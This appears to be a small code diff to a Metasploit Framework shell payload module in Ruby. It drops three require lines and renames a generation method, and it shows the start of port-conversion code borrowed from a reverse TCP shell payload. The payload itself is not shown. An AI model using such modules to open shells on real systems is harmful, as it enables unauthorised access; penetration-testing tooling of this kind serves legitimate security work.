@@ -3,9 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
@@ -27,7 +24,7 @@ module MetasploitModule
       'Session'       => Msf::Sessions::CommandShellUnix,
       ))
 
-    def generate_stage
+    def generate(opts={})
       # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb
       port_order = ([1,0]) # byte ordering
       tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
